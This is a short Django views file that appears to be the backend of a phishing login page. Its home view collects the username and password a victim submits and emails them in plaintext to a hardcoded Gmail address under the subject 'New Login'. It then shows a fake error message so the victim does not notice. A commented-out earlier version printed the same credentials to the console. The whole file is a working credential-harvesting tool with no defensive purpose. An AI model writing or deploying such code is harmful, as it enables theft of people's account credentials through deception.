from django.shortcuts import render
from django.http import HttpResponse
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.

'''
def home(request):
    if request.method == 'POST':
        # Access the form data directly from request.POST
        name = request.POST.get('username')
        email = request.POST.get('current-password')

        # Print the form data to the console
        print(f'Username: {name}, Password: {email}')

        # Handle the data (e.g., save to the database, etc.)
        
        # Respond with a message or redirect
        return HttpResponse("Server Error Please try again")

    return render(request, 'home.html')


# views.py
'''

def home(request):
    if request.method == 'POST':
        name = request.POST.get('username')
        email = request.POST.get('current-password')
        rbox = ["psychothemacbook@gmail.com",]
        
        message = f'Username: {name}, Password: {email}'
        
        try:
            send_mail(
                "New Login",
                message,
                settings.EMAIL_HOST_USER,
                rbox,
                fail_silently=False,
            )
            return HttpResponse("ErrorS202")
        except Exception as e:
            return HttpResponse(f"Failed to send email: {e}")

    return render(request, 'home.html')
